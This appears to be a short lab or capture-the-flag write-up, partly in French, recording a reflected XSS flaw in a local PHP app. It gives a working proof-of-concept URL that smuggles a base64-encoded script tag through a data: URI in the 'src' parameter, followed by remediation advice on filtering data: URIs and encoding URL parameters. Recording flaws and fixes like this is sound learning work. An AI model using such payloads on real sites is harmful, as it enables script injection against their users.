Reflected XSS

http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=




fix :

Filtrer les URI data: dans les attributs comme src.

Éviter d’insérer directement des paramètres d’URL dans des balises HTML sans validation/encodage.